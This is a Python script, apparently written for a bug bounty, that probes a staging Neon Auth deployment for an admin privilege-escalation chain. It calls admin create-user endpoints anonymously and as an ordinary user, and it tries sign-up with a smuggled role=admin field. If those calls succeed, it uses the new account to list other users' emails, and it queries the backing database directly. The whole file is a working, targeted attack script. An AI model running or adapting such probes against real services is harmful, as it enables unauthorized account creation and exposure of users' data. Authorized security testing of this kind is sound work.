# -*- coding: utf-8 -*-
"""V16: admin plugin escalation chain.
Signals from V15: admin/* POST endpoints return 400 (body validation) ANONYMOUSLY,
not 401 -> is authz checked at all? And does sign-up honor a role field?
Tests:
 A. anon admin/create-user full body (new user)
 B. anon admin/create-user with role=admin
 C. authed normal user admin/create-user
 D. sign-up with role=admin -> can it list users?
 E. DB user table: role column? what roles exist?"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
TS = str(int(time.time()))[-6:]


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000", timeout=25):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if origin is not None:
            hdrs["Origin"] = origin
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.35)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.35)
        return None, str(e)[:120], ""


def auth(email, pw=PASS):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": pw})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def main():
    out("== V16 admin plugin escalation chain ==")
    fetch_db_uri()
    # E: schema first
    try:
        cols = dbq("SELECT column_name, data_type FROM information_schema.columns "
                   "WHERE table_schema='neon_auth' AND table_name='user' ORDER BY ordinal_position")
        out("user cols: %s" % [c[0] for c in cols])
        roles = dbq("SELECT DISTINCT role FROM neon_auth.user")
        out("distinct roles: %s" % roles)
    except Exception as e:
        out("schema probe err: %s" % str(e)[:150])

    c1 = auth(U1)
    # A: anon admin/create-user full body
    ea = "libobo1229+v16a%s@gmail.com" % TS
    st, d, _ = na("POST", "/neondb/auth/admin/create-user",
                  {"email": ea, "password": PASS, "name": "v16a"})
    out("A anon create-user      -> %d %s" % (st, d[:160]))
    if st == 200:
        r = dbq("SELECT id, role FROM neon_auth.user WHERE email=%s" % ("'" + ea + "'"))
        out("   created user: %s" % r)
        ca = auth(ea)
        if ca:
            st2, d2, _ = na("GET", "/neondb/auth/admin/list-users", cookie=ca)
            out("   new user list-users -> %d %s" % (st2, d2[:200]))
    # B: anon create-user with role=admin
    eb = "libobo1229+v16b%s@gmail.com" % TS
    st, d, _ = na("POST", "/neondb/auth/admin/create-user",
                  {"email": eb, "password": PASS, "name": "v16b", "role": "admin"})
    out("B anon create-user+role -> %d %s" % (st, d[:160]))
    if st == 200:
        r = dbq("SELECT id, role FROM neon_auth.user WHERE email=%s" % ("'" + eb + "'"))
        out("   created user: %s" % r)
    # C: authed normal user create-user
    ec = "libobo1229+v16c%s@gmail.com" % TS
    st, d, _ = na("POST", "/neondb/auth/admin/create-user",
                  {"email": ec, "password": PASS, "name": "v16c"}, cookie=c1)
    out("C user create-user      -> %d %s" % (st, d[:160]))
    if st == 200:
        r = dbq("SELECT id, role FROM neon_auth.user WHERE email=%s" % ("'" + ec + "'"))
        out("   created user: %s" % r)
    # D: sign-up with role=admin
    ed = "libobo1229+v16d%s@gmail.com" % TS
    st, d, _ = na("POST", "/neondb/auth/sign-up/email",
                  {"email": ed, "password": PASS, "name": "v16d", "role": "admin"})
    out("D sign-up role=admin    -> %d %s" % (st, d[:160]))
    if st in (200, 201):
        r = dbq("SELECT id, role FROM neon_auth.user WHERE email=%s" % ("'" + ed + "'"))
        out("   created user: %s" % r)
        cd = auth(ed)
        if cd:
            st2, d2, _ = na("GET", "/neondb/auth/admin/list-users", cookie=cd)
            out("   role=admin list-users -> %d %s" % (st2, d2[:250]))
            if st2 == 200:
                try:
                    j = json.loads(d2)
                    users = j.get("users") or j.get("user") or j
                    if isinstance(users, list):
                        out("   !! can see %d users; emails: %s" % (
                            len(users), [u.get("email") for u in users][:5]))
                except Exception:
                    out("   response: %s" % d2[:300])
    # cleanup any created
    for e in (ea, eb, ec, ed):
        try:
            dbq("DELETE FROM neon_auth.user WHERE email=%s" % ("'" + e + "'"))
        except Exception:
            pass
    out("done")


if __name__ == "__main__":
    main()
